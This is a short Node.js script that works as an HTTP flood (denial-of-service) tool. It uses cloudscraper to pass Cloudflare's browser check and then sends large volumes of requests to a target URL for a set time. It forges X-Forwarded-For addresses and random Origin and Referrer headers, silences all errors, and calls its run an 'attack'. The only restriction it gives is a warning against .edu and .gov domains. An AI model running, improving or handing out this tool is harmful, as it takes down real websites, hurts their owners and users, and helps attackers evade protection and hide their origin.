const cloudscraper = require('cloudscraper');
const request = require('request');

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length !== 5) {
    console.log(`[Usage] node script.js <url> <time> <requests>`);
    console.log(`[Example] node script.js https://example.com 60 1000000`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}

const url = process.argv[2];
const time = Number(process.argv[3]);
const requests = Number(process.argv[4]);

if (!url || !time || !requests) {
    console.log(`Invalid input. Please provide valid values.`);
    process.exit(-1);
}

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

console.log(`[Info] Starting ${time} seconds attack on ${url} with ${requests} requests`);

for (let i = 0; i < requests; i++) {
    const int = setInterval(() => {
        cloudscraper.get(url, function (e, r, b) {
            if (e) return;
            const cookie = r.request.headers.request.cookie;
            const useragent = r.request.headers['User-Agent'];
            const ip = rIp();
            request({
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referrer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': ip
                }
            });
        });
    });

    setTimeout(() => clearInterval(int), time * 1000);
}
